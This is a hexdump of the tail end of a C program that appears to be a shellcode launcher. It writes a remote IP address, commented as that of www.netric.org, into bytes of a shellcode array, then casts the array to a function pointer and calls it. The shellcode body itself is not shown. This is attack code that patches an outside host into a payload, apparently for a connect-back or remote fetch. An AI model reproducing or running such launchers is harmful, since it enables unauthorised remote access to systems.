000012f0  29 0d 0a 7b 0d 0a 20 20  20 20 20 20 20 20 76 6f  |)..{..        vo|
00001300  69 64 20 28 2a 66 75 6e  63 74 29 28 29 3b 0d 0a  |id (*funct)();..|
00001310  0d 0a 20 20 20 20 20 20  20 20 73 68 65 6c 6c 63  |..        shellc|
00001320  6f 64 65 5b 33 33 5d 20  3d 20 38 31 3b 20 20 20  |ode[33] = 81;   |
00001330  20 20 2f 2a 20 69 70 20  6f 66 20 77 77 77 2e 6e  |  /* ip of www.n|
00001340  65 74 72 69 63 2e 6f 72  67 20 3a 29 20 2a 2f 0d  |etric.org :) */.|
00001350  0a 20 20 20 20 20 20 20  20 73 68 65 6c 6c 63 6f  |.        shellco|
00001360  64 65 5b 33 34 5d 20 3d  20 31 37 3b 0d 0a 20 20  |de[34] = 17;..  |
00001370  20 20 20 20 20 20 73 68  65 6c 6c 63 6f 64 65 5b  |      shellcode[|
00001380  33 35 5d 20 3d 20 34 36  3b 0d 0a 20 20 20 20 20  |35] = 46;..     |
00001390  20 20 20 73 68 65 6c 6c  63 6f 64 65 5b 33 36 5d  |   shellcode[36]|
000013a0  20 3d 20 31 35 36 3b 0d  0a 0d 0a 20 20 20 20 20  | = 156;....     |
000013b0  20 20 20 28 6c 6f 6e 67  29 20 66 75 6e 63 74 20  |   (long) funct |
000013c0  3d 20 26 73 68 65 6c 6c  63 6f 64 65 3b 20 0d 0a  |= &shellcode; ..|
000013d0  20 20 20 20 20 20 20 20  66 75 6e 63 74 28 29 3b  |        funct();|
000013e0  20 20 20 20 20 20 20 20  0d 0a 20 20 20 20 20 20  |        ..      |
000013f0  20 20 72 65 74 75 72 6e  20 30 3b 0d 0a 7d        |  return 0;..}|
000013fe
